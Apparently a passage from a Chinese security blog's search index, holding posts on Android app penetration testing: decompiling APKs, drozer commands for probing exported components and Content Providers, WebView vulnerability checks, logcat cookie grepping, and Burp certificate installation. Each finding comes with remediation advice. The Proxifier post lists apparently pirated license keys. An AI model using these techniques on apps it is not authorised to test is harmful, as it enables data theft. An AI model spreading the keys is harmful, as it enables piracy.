bug，提醒开发者注意自己应用支持的最低版本的系统可能存在的问题。\n","categories":["app渗透测试"]},{"title":"apk逆向","url":"/2022/12/08/2022/apk%E9%80%86%E5%90%91/","content":"每天给自己一个希望，试着不为明天而烦恼，不为昨天而叹息，只为今天更美好。\n\n\n\n一、dex2jar可将dex文件反编译成jar文件，再由jd-gui工具进行源代码查看。\n官网链接：https://github.com/pxb1988/dex2jar\n使用方法：\n将apk包解压缩，里面有classes.dex，如图所示\n\n\n\n将 classes.dex文件放到dex2jar目录中\n\n一定要这么放，不能将d2j-dex2jar.bat文件拿出运行。会报错。\n\n\n在dex2jar目录 中运行命令：\n\nd2j-dex2jar.bat classes.dex\n\n\n即可获得 逆向后的jar包。\n\n\n二、jd-gui查看反编译的jar包 源码\n官网链接：https://github.com/java-decompiler/jd-gui\n可加载jar文件通过java 打开。\n也可直接下载windows可执行文件。\n看到源码后，保存所有源代码，格式为zip。解压缩后 通过VScode打开项目。即可详细查看。\n\n\n\n三、apktool 反编译可查看apk包里xml文件以及smail文件。 同时也可以使用apktool重新编译apk包。\n官网链接：https://github.com/iBotPeaches/Apktool\ncmd命令如下\njava -jar .\\apktool_2.7.0.jar d 【安装包名】-o 【输出的文件夹】\n\n\n无任何报错即可。\n","categories":["app渗透测试"]},{"title":"Android组件安全","url":"/2022/12/08/2022/Android%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/","content":"生活其实也很简单，喜欢的就争取，得到的就珍惜，失去了就忘记。\n\n\n\n一、Activity组件Activity 是 Android 定义的四大组件之一，也是最重要使用最多的组件。Activity 用来提供一个用户与应用交互的界面。\nActivity 的大部分安全问题都是由于导出造成的【导出状态：可以被其他 APP 调用】。\n学习链接：《Android Activity安全》——安卓APP安全测试\n1.1 [高]Activity 越权访问使用drozer1、run app.activity.info –a  [包名]     //可以列出导出的 Activity，以及所需要的权限。找到对外的Activity组件后,运行：2、run app.activity.start --component [包名] [敏感Activity组件名]\n\n若测试中，发现越权访问的页面则存在 Activity 越权访问漏洞。\n漏洞描述\n开发者为方便外部调用，会把 Activity 组件设置为导出状态。如果由于开发者的疏忽，把一些包含用户敏感信息或可进行敏感操作的组件设置为导出状态。攻击者就可以利用此漏洞，越权查看敏感信息泄露以及越权操作等安全风险。\n漏洞建议\n将不必要导出的组件设置为不导出的状态：\n\n Activity不需要导出，请将exported属性设置为false \n 若导出仅为内部通信使用，则设置protectionLevel=signature \n 设置自定义的权限，限制对activity的访问 \n\n1.2 [高] Activity 拒绝服务【无法自行编写对应EXP】漏洞描述Android组件之间采用Intent来传递数据，如果应用在使用getIntent()，getAction()，Intent.getXXXExtra()获取到空数据、异常或者畸形数据时没有进行异常捕获，应用就会发生Crash，应用不可使用（本地拒绝服务）。恶意应用可通过向受害者应用发送此类空数据、异常或者畸形数据从而使应用产生本地拒绝服务。\n漏洞建议\n\n将不必要导出的组件调整为不导出。\n对 intent 的数据处理进行保护\n如果 Activity 必须导出，则可以通过添加权限的方式，缩小暴露范围。\n\n1.3 [高] Activity 界面劫持漏洞描述\n恶意应用将启动自己仿冒的界面覆盖原界面.用户在毫无察觉的情况下输入登录信息,恶意程序在把获取的数据返回给服务端\n测试过程\n安装 HijackActivity.apk,选中想要劫持应用的包名.然后启动目标应用。查看结果\n\n漏洞建议\n在 Activity 的 OnPause 函数中加入提示信息,每当 Activity 切换到后台的时候给出提示信息 使用外部产品进行防护。\n\n二、Service组件AService 是 Android 定义的四大组件之一，它没有界面，通常用于在后台完成用户指定的操作。\n学习链接：《Android Service 安全》——安卓APP安全测试\n与 Activity 组件 一样，Service 的大部分安全问题也是是由于导出造成的，\n2.1 [高]Service 越权操作使用drozer1、run app.service.info  –a  [包名]     //查看对外的service组件信息,找到对外的service组件后,运行：2、run app.service.start --component [包名] [敏感service组件名] 【--extra string [参数名称一] [参数值一] 【--extra string [参数名称二] [参数值二] 】】\n\n或者使用adb 命令启动被导出的 Service，确认 Service 是否存在敏感信息泄露和越权操作等安全风险：\nadb shell am start service –n pachage_name/service_name\n\n漏洞描述\n开发者为方便外部调用，会把 service 组件设置为导出状态。如果由于开发者的疏忽，把一些包含用户敏感信息或可进行敏感操作的组件设置为导出状态。攻击者就有机会利用此漏洞进行越权操作。\n漏洞建议\n\n 判断 Service 是否真的有必要导出，如果无必要，则设置为非导出。 \n 如果 Service 必须导出，则可以通过添加权限的方式，缩小暴露范围。 \n 对通过 intent 获取的数据做合法性校验。 \n\n2.2 [高]Service 拒绝服务【无法自行编写对应EXP】同 Activity 中的拒绝服务原理一样。参见 “1.2 [高] Activity 拒绝服务”\n\n三、Broadcast receiver 组件Broadcast receiver 是 Android 定义的四大组件之一，它没有界面，通常用来处理系统级事件。\n它是程序之间传递信息时的一种机制，作用就是接收或者发送通知。通俗的来说广播接收器更像是一种传递组件，它能够将信息接收，甚至还可以对它进行过滤然后进行响应。\n一个应用可以在发生特定事件时发送广播，而系统中任何应用只要注册了对应的 Receiver 就会接收到此广播。\n一个应用如果对某个广播感兴趣，就可以注册对应的 Receiver 来接收广播。\n广播事件机制是应用程序（进程）间通信的一种手段。\n学习链接：《Android Content Provider 安全》——安卓APP安全测试\n3.1 [高]Broadcast 广播敏感信息泄露【无法自行编写对应EXP】3.1.1 找出攻击面\n找出静态注册的 Broadcast receiver：\n\n使用drozer\trun app.broadcast.info  –a  [包名]     //查看对外的broadcast组件信息,\n\n\n找出动态注册的 Broadcast receiver：\n\n通过反编译 apk 文件，获得源码，搜索 registerReceiver。eg：\n\n\n找出发送广播：\n\n通过反编译 apk 文件，获得源码。搜索 sendBroadcast、sendOrderedBroadcast\n3.1.2 利用攻击面需根据实际场景，去自行编写app。注册相应的广播接收器来接收消息，从而导致敏感信息泄露\n由于java能力不足，无法自行编写对应EXP。\n漏洞建议\n\n 判断是否真的有必要导出，如果无必要，则设置为非导出。 \n 如果必须导出，则可以通过添加权限的方式，缩小暴露范围。 \n 对通过 intent 获取的数据做合法性校验。 \n 尽量不要使用广播发送敏感数据，如发送则需要限制好接受者的权限，或者通过显示意图、setPackage(String packageName)来指定接收器。 \n\n参考链接：《Android Content Provider 安全》——安卓APP安全测试\n3.2 [高]Broadcast 拒绝服务【无法自行编写对应EXP】同 Activity 中的拒绝服务原理一样。参见 “1.2 [高] Activity 拒绝服务”\n3.3 [高] 有序广播导致的拒绝服务 【无法自行编写对应EXP】漏洞原理：我们可以在恶意 app 中注册同样的广播接收器，然后将优先级设置到最大，最先收到广播数据，甚至可以中断广播，导致正常业务无法运行。\n\n四、Content Provider 组件Content Provider 是 Android 定义的四大组件之一，Content Provider使一个应用程序的指定数据集提供给其他应用程序。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。\nContentProvider实现数据共享。是不同应用程序间共享数据的唯一方式，因为android没有提供所有应用共同访问的公共存储区。\n为了实现应用间的数据交互，一般 Content Provider 都会设置为暴露。\n学习链接：《Android Content Provider 安全》——安卓APP安全测试\n4.1 [高] Provider 未授权访问敏感数据（数据泄露）\n找出暴露的组件：\n\n使用drozer\trun app.provider.info  –a  [包名]可以列出导出的 Content Provider，以及所需要的权限。\n\n\n找出URI：方法一： \n\n使用drozer\trun app.provider.finduri [包名]注：drozer 工具，只是在 dex 文件和 AndroidManifest.xml 中搜索字符串，会出现漏报。\n\n方法二：    编译 apk 文件，在代码中查找 UriMatcher.addURI ，并手动拼接 uri。eg：\n\n 找到URI后，在 AndroidManifest.xml 查看 是否对所有路径进行了限制。 \n\n\n\n验证未限制的URI：\n\n使用drozer：\trun app.provider.query [扫描出来的URI]  //根据扫描出来的URI，进行访问，查看是否可以看到一些敏感信息。\n\n\n出现敏感数据即为漏洞。\n漏洞描述\nContent Provider是安卓应用组件，以表格的形式把数据展现给外部的应用。每个Content Provider都对应一个以”content://”开头的特定URI，任何应用都可以通过这个URI操作Content Provider 应用的数据库。如果应用对权限控制不当就会造成信息泄露。\n漏洞建议\n\n 判断 Content Provider 是否真的有必要导出，如果无必要，则设置为非导出。 \n 如果 Content Provider 必须导出，则可以通过添加权限的方式，缩小暴露范围。 \n\n4.2 [高] Provider 数据参数常规渗透使用drozer：\trun app.provider.query &quot;URI&quot;  来验证\n\n当发现drozer验证URI 未报权限错误时，即可把URI的参数当成常规参数来进行日常渗透。eg：\n4.2.1 SQL注入\n4.2.2 任意文件读取\n\n附一、Webview 组件安全检测WebView 是 Android 系统定义的一个的控件，其继承自 AbsoluteLayout，相当于一个微型的浏览器，可以用来显示网页、执行 JavaScript 等。\n1.1 [高] Webview 远程代码执行漏洞检测检测方法\n\n查看 最小兼容版本（minSdkVersion） 版本，若大于17则没有漏洞。\n\n方法一：使用drozer:\trun app.package.manifest [包名]\n\n\n\n反编译源代码。静态代码扫描加人工复核的方式\n\n在代码内全局搜索 WebView.addJavascriptInterface ，并记录位置:\tWebView.addJavascriptInterface(Object obj, String interfaceName)  漏洞触发的前提条件：\t使用addJavascriptInterface方法注册可供JavaScript调用的Java对象；  \t使用WebView加载外部网页或者本地网页； \tAndroid系统版本低于4.2；\n\n漏洞描述\nAndroid API &lt; 17 之前版本存在远程代码执行安全漏洞，该漏洞源于程序没有正确限制使用 addJavaScriptInterface(CVE-2012-6636)方法，攻击者可以通过 Java 反射利用该漏洞执行任意 Java 对象的方法，导致远程代码执行安全漏洞\n漏洞建议\n\n将最小兼容版本（minSdkVersion）大于等于17，此漏洞则不存在风险。\n在Android版本小于17中使用，不使用addJavascriptInterface方法，若要实现JavaScript调用java对象的功能，可以拦截prompt方法来实现此功能，以此来规避漏洞。\n\n\n1.2 [高]  Webview 通过file跨域访问任意文件检测方法\n\n反编译，查看源码。WebViewActivity.java\n\n\n\n查看 setAllowFileAccess 属性值        #该方法来控制WebView是否能够访问本地html文件\n\n\n\n查看 setAllowFileAccessFromFileURLS()        #该方法决定是否允许JS使用file域访问本地文件。此功能破坏了同源策略SOP的限制。\n\n\n漏洞描述\nJavaScript的延时执行能够绕过file协议的同源检查，并能够访问受害应用的所有私有文件，即通过WebView对Javascript的延时执行和将当前Html文件删除掉并软连接指向其他文件就可以读取到被符号链接所指的文件，然后通过JavaScript再次读取HTML文件，即可获取到被符号链接所指的文件。大多数使用WebView的应用都会受到该漏洞的影响，恶意应用通过该漏洞，可在无特殊权限下盗取应用的任意私有文件，尤其是浏览器，可通过利用该漏洞，获取到浏览器所保存的密码、Cookie、收藏夹以及历史记录等敏感信息，从而造成敏感信息泄露。\n漏洞建议\n\n将不必要导出的组件设置为不导出如果应用的组件不必要导出，建议显式设置所注册组件的“android:exported”属性为 false；\n如果应用的需要导出包含 WebView 的组件,建议禁止使用 File 域协议。\n如果需要使用 File 协议，禁止 File 协议调用 JavaScript\n\n\n1.3 [中]  WebView 密码明文存储漏洞检测检测方法\n\n反编译，查看源码。遍历查询调用了setSavePassword 的函数路径，然后再获取函数参数值，判断参数值是否为true。中风险：代码中未调用setSavePassword(false)，或设置setSavePassword(ture)；无风险：代码中调用setSavePassword(false)。\n\n\n漏洞描述\nwebview 的保存密码功能默认设置为 true。在使用WebView的过程中忽略了WebView setSavePassword，当用户选择保存在WebView中输入的用户名和密码，则会被明文保存到应用数据目录的databases/WebView.db中。如果手机被root就可以获取明文保存的密码，造成用户的个人敏感数据泄露。\n漏洞建议\n\n显示设置 webView.getSetting().setSavePassword(false)。\n\n","categories":["app渗透测试"]},{"title":"drozer工具使用","url":"/2022/12/08/2022/drozer%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/","content":"心情可以交给鸡汤安慰，但是命运请一定要交给努力保管，致所有追梦路上的你！\n\n\n\n一、drozer工具的安装drozer使用python2.7编写不支持python3.x。\nPC： https://github.com/mwrlabs/drozer/releases/\n\nAPK：https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk\n参考链接：drozer安装使用教程（Windows）\n\n二、drozer的使用2.1、前期准备\nadb forward tcp:31415 tcp:31415 \n手机打开软件 “drozer server” \n在drozer目录下运行 cmd   **cd** **F:\\web\\7、app渗透测试\\drozer** （如果不在这里启动，将无法使用模块） \n执行 **drozer console connect** 命令 \n输入 list 或 ls 命令即可查看drozer所有可用模块 \n\n2.2 常用的drozer命令\n\n\nrun app.package.info -a &lt;包名&gt;\n运行这条命令会打印出包相关的信息，包括版本、路径、权限、uid、gid等。\n\n\n\nrun app.package.attacksurface &lt;包名&gt;\n运行这条命令之后会打印出这个应用四大组件的攻击面，Activity, Service, Content Provider, Broadcast是否有暴露的风险\n\n\nrun app.activity.info -a &lt;包名&gt;\n运行这条命令会打印出exported的activity，并且显示是否需要相应的权限。同样的可以通过调用app.service.info 、app.broadcast.info 、app.provider.info 模块来查看其他组件的详细信息\n\n\nrun app.activity.start –component &lt;包名&gt; \n如果activity是exported并且不需要权限，那么运行这条命令就可以启动相应的activity了\n\n\n如果任何模块有疑问的或者不会使用的，可以通过-h（help）来查看相应的帮助信息 \n\n三、踩坑3.1 问题一：报错 Could not find java.\n解决办法：\n建立名为 .drozer_config 的文件，文件中添加如下内容：\n[executables]java=D:\\Sun\\Java\\jdk1.7.0_65\\bin\\java.exejavac=D:\\Sun\\Java\\jdk1.7.0_65\\bin\\javac.exe即java和javac的路径\n\n保存后存放到C:\\Users\\XXX\\ 目录下，其中XXX为我的用户名，即可解决。\n\n\n3.2 问题二：中文乱码在linux一切正常，在windows中就会出现中文乱码。\n解决办法：\n参考链接：https://www.jianshu.com/p/4c563c91431d\n\n","categories":["app渗透测试"]},{"title":"app其他漏洞记录","url":"/2022/12/08/2022/app%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/","content":"只有比别人更早、更勤奋地努力，才能更快地尝到成功的滋味。\n\n\n\n一、Activity组件[高] 不安全的本地存储检测方法\n\nShared Preferences是用key-value来存储私有的原始数据的xml文件。数据类型有布尔型，浮点型，整形，长整型和字符串。\n\n通常情况下存储的路径为：/data/data/&lt;package name&gt;/shared_prefs/&lt;filename.xml&gt;。直接打开查看是否有敏感数据。\n\nSQLite数据库是轻量级基于文件的数据库。这些文件通常以db或者sqlite结尾。安卓默认提供了大量SQLite支持。\n\n应用的数据库一般存储在下面的地方：\n/data/data/&lt;package name&gt;/databases/&lt;databasename.db&gt;，可以使用SQLite数据库直接打开查看是否有敏感数据。\n\n检查SD卡目录中是否存在敏感数据。\n\n如何查看数据：通过adb shell + vim命令 查看\n\n漏洞描述\n安卓开发者使用多种方法将数据存储在安卓应用中，而存储在本地的数据文件如果未加密，易造成敏感信息泄漏。\n[高] 可以重新编译打包检测方法\n​    中风险：应用程序可在已root的设备上运行，且完全没有任何提示。\n漏洞描述\n\n对源代码进行修改后，使用ApkTool对修改过的文件夹进行重新编译。新的apk输出到反编译源码文件夹的dist目录\n\napktool b [反编译源码的文件夹] -o [新apk名称]\n\n\n\n重新编译自签名打包\n\n\n\n[中] root环境检测检测方法\n应用程序可在已root的设备上运行，且完全没有任何提示。\n漏洞描述\n检测运行客户端程序的手机是否经过 root。在 root 的手机上，攻击者可以对应用进行调试、内存访问修改、HOOK 关键 API 等操作，极大影响客户端安全，因此需要对运行环境进行检测，并且对用户进行安全提示\n漏洞建议\n\n在APP启动时，尝试执行su命令或查找su文件，除非找不到文件否则一律视为异常，并停止运行。示例代码： \n\n/**  * 判断手机是否ROOT  */  public boolean isRoot() &#123;  \tboolean root = false;  \ttry &#123;  \t\tif ((!new File(&quot;/system/bin/su&quot;).exists())  \t\t\t\t&amp;&amp; (!new File(&quot;/system/xbin/su&quot;).exists())) &#123;  \t\t\troot = false;  \t\t&#125; else &#123;  \t\t\troot = true;  \t\t&#125;  \t&#125; catch (Exception e) &#123;  \t&#125;  \treturn root;  &#125;\n\n\n[中] Logcat 日志检测检测方法\n使用命令# adb logcat在终端中打印出所有的日志。通过logcat的选项来过滤感兴趣的内容。或者通过命令`#adb logcat &gt; output.txt` ，将日志保存到电脑本地，以便后期进一步分析。\n\n\n-v verbose  打印详细\n-d debug  打印调试级日志\n-I information 打印提示级日志\n-e error   打印错误级日志\n-w warning  打印警告级日志\n\neg:\n\n附： 尝试使用命令#adb logcat|grep “cookie”可以从logcat的输出中过滤出诸如cookies等敏感信息。\n\n漏洞描述\n当APP处理用户或其它数据源输入的数据时，把部分敏感数据放在日志中，容易被攻击者利用造成信息泄露\n漏洞建议\nAPP 的错误采集，异常反馈，必要的日志还是要被输出的，建议使用 ProGuard 等工具在 APP 的发行版本(release)中自动删除Log.d()和 Log.v()对应的代码\n\n[中] 代码混淆检测检测方法\n对应用程序进行反编译，查看代码是否做混淆处理(加壳)\n漏洞描述\n应用程序关键代码明文暴露降低了攻击者入侵和利用的门槛，攻击者或恶意程序可通过修改代码获取关键信息或绕过部分逻辑直接操作。\n漏洞建议\n\n使用混淆工具对源码做混淆处理。\n\n","categories":["app渗透测试"]},{"title":"夜神代理添加burp证书","url":"/2022/12/08/2022/%E5%A4%9C%E7%A5%9E%E4%BB%A3%E7%90%86%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/","content":"人的一生可能燃烧也可能腐朽。我不能腐朽，我愿意燃烧起来。\n\n\n\n一、Android 7.0以上版本的夜神安装证书1、burp 导出CER证书：bp.cer\n2、在linux系统中：\nopenssl x509 -inform der -subject_hash_old -in bp.cer\n\n结果如下：我们记住这个9a5ba575等会儿用得到\n\n3、执行如下命令（如果你的文件名跟我的不一致，请替换哦）：\nopenssl x509 -inform der -text -in bp.cer -out 9a5ba575.0\n\n会生成9a5ba575.0文件，内容如下：\n\n4、将文件复制到本机中，并将 —–BEGIN CERTIFICATE—– 后面的所有内容移动到最开始\n移动前：\n\n移动后：\n\n5、使用adb将证书移动到夜神中：\n查看当前连接设备：adb devices连接手机，执行adbadb push &lt;hash&gt;.0 /system/etc/security/cacerts加上权限adb shell chmod 644 /system/etc/security/cacerts/&lt;hash&gt;.0重启手机，查看证书是否安装完成。\n\n注： 如果报错：remote couldn’t create file:Read-only file system。\n解决方法：\nadb rootadb remount重新加载文件系统，改变文件夹权限，然后重新push,问题解决。\n\n\n","categories":["app渗透测试"]},{"title":"porxifier下载与代理夜神","url":"/2022/12/08/2022/porxifier%E4%B8%8B%E8%BD%BD%E4%B8%8E%E4%BB%A3%E7%90%86%E5%A4%9C%E7%A5%9E/","content":"其实真正对你好的人，你一辈子，也不会遇到几个。\n\n\n\n一、proxifier 下载proxifier官网（需连VPN）\n激活码：\nLYZGL-F2KX3-JW5W4-A33MC-25QHH\n5EZ8G-C3WL5-B56YG-SCXM9-6QZAP\nG3ZC7-7YGPY-FZD3A-FMNF9-ENTJB\nYTZGN-FYT53-J253L-ZQZS4-YLBN9\nLYZGL-F2KX3-JW5W4-A33MC-25QHH\nECZ83-82S6F-AM2WR-Z5ASV-JC3CG\n2LZLR-WYDXF-NEA3A-UKVUB-75KCA\n\n\n二、proxifier 代理夜神浏览器代理服务器设置成127.0.0.1:8080 https\n新建代理规则：\n夜神的程序为NoxVMHandle.exe \n找到方法：任务管理器——详细信息——长的那个\n\n\n","categories":["app渗透测试"]},{"title":"云计算入门学习","url":"/2023/06/29/2023/%E4%BA%91%E8%AE%A1%E7%AE%97%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/","content":"ssss\n","categories":["app渗透测试"]}]